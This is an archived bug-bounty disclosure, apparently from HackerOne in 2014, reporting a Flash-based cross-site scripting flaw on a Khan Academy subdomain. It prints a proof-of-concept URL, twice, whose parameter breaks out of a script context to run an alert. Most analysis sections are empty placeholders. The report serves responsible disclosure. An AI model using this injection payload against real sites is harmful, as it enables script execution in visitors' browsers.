# XSS at  http://smarthistory.khanacademy.org

## Metadata
- **Source:** HackerOne
- **Report:** 6575 | https://hackerone.com/reports/6575
- **Submitted:** 2014-04-08
- **Reporter:** prakharprasad
- **Program:** Unknown
- **Bounty:** Not disclosed
- **Severity:** unknown
- **Vuln:** Cross-site Scripting (XSS) - Generic
- **CVEs:** None
- **Category:** web-api

## Summary
Hi,

There is a SWF-based XSS : http://smarthistory.khanacademy.org/assets/flash/cozimo.swf?iceID=\%22%29%29}catch%28e%29{alert%28%27XSS%27%29;}//

Opening the link would trigger JavaScript execution! Works in possibly any browser with **Adobe Flash, i.e - Chrome, Firefox**


Thanks!

## Attack scenario
*(see original)*

## Root cause
*(see original)*

## Attacker mindset
*(see original)*

## Defensive takeaways
*(see original)*

## Variant hunting
*(see original)*

## MITRE ATT&CK
*(see original)*

## Notes
*(see original)*

## Full report
<details><summary>Expand</summary>

Hi,

There is a SWF-based XSS : http://smarthistory.khanacademy.org/assets/flash/cozimo.swf?iceID=\%22%29%29}catch%28e%29{alert%28%27XSS%27%29;}//

Opening the link would trigger JavaScript execution! Works in possibly any browser with **Adobe Flash, i.e - Chrome, Firefox**


Thanks!

</details>

---
*Analysed by Claude on 2026-05-24*
